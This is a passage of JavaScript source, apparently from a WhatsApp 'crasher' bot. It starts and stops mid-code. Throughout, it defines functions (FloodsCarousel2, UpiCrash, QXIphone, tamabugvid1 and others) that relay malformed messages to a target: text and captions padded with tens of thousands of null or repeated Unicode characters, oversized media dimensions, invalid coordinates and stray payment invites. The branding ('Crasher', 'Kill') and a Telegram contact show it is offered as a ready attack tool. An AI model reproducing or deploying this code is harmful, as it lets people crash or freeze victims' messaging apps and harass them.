                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Zyn_Xzo",
                mediaUrl: "https://t.me/Zyn_Xzo",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Zyn_Xzo",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function FloodsCarousel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
          { upload: dhikaXs.waUploadToServer }
        )),
        title: "𝗝𝗶𝗻𝗭𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ" + "\u0000".repeat(100000),
        subtitle: "𝐙𝐲𝐧𝐗𝐳𝐨 𝐊𝐢𝐥𝐥⃟⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " 𝗝𝗶𝗻𝗫𝘇𝗼 ϟ ",
            rows: [
              {
                title: " ϟ 𝐙𝐲𝐧𝐗𝐳𝐨 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: " 𝗝𝗶𝗻𝗫𝘇𝗼 ϟ ",
            rows: [
              {
                title: " ϟ 𝐙𝐲𝐧𝐗𝐳𝐨 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await dhikaXs.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: NullNihBos
              },
            }
          : {}
      );
    }

async function sendPoll(target, QBug) {
      var pollmsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          pollCreationMessage: {
            name: "ꦾ".repeat(55000),
          },
          documentMessage: {
            contactVcard: true,
          },
        }),
        { userJid: target, quoted: QBug }
      );
      await client.relayMessage(target, pollmsg.message, {
        participant: { jid: target, quoted: QBug },
        messageId: pollmsg.key.id,
      });
    }

    //

    async function UpiCrash(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

async function SqCrash(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await client.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://youtube.com/@tamainfinity",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      client.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "HELLO STUPID" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

async function tamabugvid1(target, qdocu) {
      var etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "o9LrGTJaHdYVWZF2UEN5RRap2JMkamsjYfs3ZPfpB4A=",
            fileLength: "236989",
            seconds: 18,
            mediaKey: "8SePyblqpUmoGyb3BP/5nAd3jydoH9HU8YZVDe/VWlU=",
            caption: "⩟⬦𪲁 𝐓͜͢𝐀͠𝐌̋͡𝐀̸̷̷̷͡𝐗͜͢𝐒 -" + "ꦾ".repeat(90000),
            height: 99999,
            width: 99999,
            fileEncSha256: "ABMHTzddlN1NzTAug/7LXAMrA22yJCdnhQTXoLDXQJ0=",
            directPath:
              "/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&_nc_hot=1730912455",
            mediaKeyTimestamp: "1730912449",
            jpegThumbnail:
              "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",
            streamingSidecar:
              "4PsGNVYL/bmKyy08TD4HRhVW/0B13syEWleRiLNIS+fPsl4I+Z5KdQ==",
            thumbnailDirectPath:
              "/v/t62.36147-24/11857855_1866356897224917_5456418343720550181_n.enc?ccb=11-4&oh=01_Q5AaIGWYh_Y1n1Q2SsCfDeAxseMvFXviOu8el3g2MzEHbNmI&oe=67531880&_nc_sid=5e03e0",
            thumbnailSha256: "mKU5Li0YYWvtFT5s6fLFLeqU5hESEVzIYWnNcgenNyY=",
            thumbnailEncSha256: "ydInxyQkYy+CPu6KAmtjLm6z9O06ATgiiAw/zcHQ/Ts=",
          },
        }),
        { userJid: target, quoted: qdocu }
      );
      await client.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id,
      });
    }

    //

    async function tamabugvid2(target, QBug) {
      var etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "o9LrGTJaHdYVWZF2UEN5RRap2JMkamsjYfs3ZPfpB4A=",
            fileLength: "236989",
            seconds: 18,
            mediaKey: "8SePyblqpUmoGyb3BP/5nAd3jydoH9HU8YZVDe/VWlU=",
            caption: "⩟⬦𪲁 𝐓͜͢𝐀͠𝐌̋͡𝐀̸̷̷̷͡𝐗͜͢𝐒 -" + "ꦾ".repeat(90000),
            height: 99999,
            width: 99999,
            fileEncSha256: "ABMHTzddlN1NzTAug/7LXAMrA22yJCdnhQTXoLDXQJ0=",
            directPath:
              "/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&_nc_hot=1730912455",
            mediaKeyTimestamp: "1730912449",
            jpegThumbnail:
              "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",
            streamingSidecar:
              "4PsGNVYL/bmKyy08TD4HRhVW/0B13syEWleRiLNIS+fPsl4I+Z5KdQ==",
            thumbnailDirectPath:
              "/v/t62.36147-24/11857855_1866356897224917_5456418343720550181_n.enc?ccb=11-4&oh=01_Q5AaIGWYh_Y1n1Q2SsCfDeAxseMvFXviOu8el3g2MzEHbNmI&oe=67531880&_nc_sid=5e03e0",
            thumbnailSha256: "mKU5Li0YYWvtFT5s6fLFLeqU5hESEVzIYWnNcgenNyY=",
            thumbnailEncSha256: "ydInxyQkYy+CPu6KAmtjLm6z9O06ATgiiAw/zcHQ/Ts=",
          },
        }),
        { userJid: target, quoted: QBug }
      );
      await client.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id,
      });
    }

async function tamabugjpg2(target, QBug) {
      var etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: "⩟⬦𪲁 𝐓͜͢𝐀͠𝐌̋͡𝐀̸̷̷̷͡𝐗͜͢𝐒 -" + "ꦾ".repeat(90000),
            fileSha256: "1DZhdaBhAo3f2HuDq4XhDgxgp24GXhVJ3rJrnTJqk00=",
            fileLength: "85631",
            height: 80000,
            width: 80000,
            mediaKey: "4m0noHF4XWMqfQw+jdP2IxKjmY9BbaCS+fo0inRyX80=",
            fileEncSha256: "hd+s3yufaLrlpxnxvWwCEJRTCpFcbrzu5EEgf+QzFW0=",
            directPath:
              "/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1730971373",
            jpegThumbnail:
              "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